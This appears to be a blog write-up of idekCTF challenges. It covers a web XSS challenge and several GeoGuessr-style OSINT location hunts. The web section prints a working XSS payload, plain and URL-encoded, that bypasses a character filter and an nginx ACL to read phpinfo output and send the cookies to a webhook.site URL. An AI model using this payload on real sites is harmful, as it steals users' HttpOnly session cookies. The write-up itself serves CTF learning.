---
layout: post
title: idekCTF Web and OSINT Writeup
tags: [ctf, ctf writeup, ctf web, ctf misc, ctf osint, ctf geoguessr]
---

Notes on solving the web challenge and some GeoGuessr-style challenges (had a lot of luck).

## web/Hello

### Solution TLDR

- Bypass XSS characters filter
- Bypass nginx ACL rules for PHP

### Challenge and Solution

Relatively easy challenge, with 161 solves. I built the payload iteratively to bypass the restrictions.

Challenge goal is to get the flag set by the admin bot in the "HttpOnly" cookie. The `index.php` page is XSS-able, and and `info.php` page dumps `phpinfo()`, which shows the cookies in the request, including HttpOnly cookies.

```nginx
location = /info.php {
    allow 127.0.0.1;
    deny all;
}

location ~ \.php$ {
    root           /usr/share/nginx/html;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include fastcgi_params;  
    fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
}
```

However, as shown above, `nginx.conf` blocks access to `info.php`, and admin bot cannot acess it either. Referencing to [HackTricks](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass), it can be bypassed with `http://idek-hello.chal.idek.team:1337/info.php/a.php`, where nginx does not match to `location = /info.php`, instead it matches to `location ~ \.php$` and PHP FPM processes with `info.php`.

```php
function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}
```

`index.php` is XSS injectable, however it does not allow some characters. It was not able to have `</script>` closing tag, and I did not get `script` tag without closing tag or using `\` instead of `/` in the closing tag work. I used `<img>` tag with `onerror` to make the script to run (`src` attribute was necessary too).

The tag looks like this:

```html
<img src=a onerror="fetch('\\info.php\\a.php').then(r=>r.text()).then(r=>fetch('https:\\\\webhook.site\\[REDACTED]',{method:'POST',body:r}))">
```

The `/` in the URLs above are replaced with `\` to bypass the filter (`\\` because of escape. It was only escaped once in JavaScript, HTML does not use `/` escape), and it still works.

Replacing space `%20` with `%0C` to bypass filter, and the encoded payload for admin bot is below:

```
http://idek-hello.chal.idek.team:1337/?name=%3Cimg%0Csrc%3Da%0Conerror%3D%22fetch%28%27%5C%5Cinfo%2Ephp%5C%5Ca%2Ephp%27%29%2Ethen%28r%3D%3Er%2Etext%28%29%29%2Ethen%28r%3D%3Efetch%28%27https%3A%5C%5C%5C%5Cwebhook%2Esite%5C%5C%5BREDACTED%5D%27%2C%7Bmethod%3A%27POST%27%2Cbody%3Ar%7D%29%29%22%3E%0A
```

## misc/NM~~PZ~~~ (GeoGuessr-style)

This is some notes on my process of solving some of the challenges with the team (also with a lot of luck involved). It may contain some errors due to limited knowledge on different locations, and just write about observations and knowledge gathered during solving the challenge.

*Image sizes are reduced in the blogpost.*

### beach_property (medium, Brazil)

Find the very unique-looking building, screenshot and search the image with Google Lens, find it to be the Veleiros Mar hotel in São Luís, Brazil. Then my teammate marked the location on the map to complete this task.

![Screenshot of Veleiros Mar hotel in the challenge](/assets/image/idekctf2024/veleiros-mar.png)

### idek_islands (medium, U.S. Virgin Islands)

Teammates identified through meta (Google car etc.) the location is in U.S. Virgin Islands, and likely to be in the island in the north. The location is by the coast, with coastline kinda concaves, and with buildings nearby. The shadows points inwards the land.

I started searching through the south coast of the two main islands in the north of U.S. Virgin Islands, by looking at the street view coverage finding the roads close to coast, and sometimes enter into street view to check. Eventually found a road with street view coverage near the coast, and the buildings in the satellite view looks matching the ones in the image. It did not take too long. Entered street view and confirmed the location matches.

### rise_above (hard, Indonesia)

It took a long time to solve this one.

Teammates identified the location in in Indonesia. There is top of a church in the image, signs on the other building saying "RUMAH KEPALA JAGA 1", and teammate also identified the "Indonesian Democratic Party of Struggle" flag in the image.

I position Google maps at Indonesia and looked up "rumah kepala jaga", it showed the name with other numbers but not "1". I looked through some of the locations however non of them was the location. They were mostly located east-most of Sulawesi Utara on one of the main island. There were also a village with many of the same flags in the image, however that village had a church looked different. Then I zoomed out the map a bit and looked up "church" in the area, and the 2nd church I clicked on and entered street view to see was the church I was looking for (extremely lucky I guess).
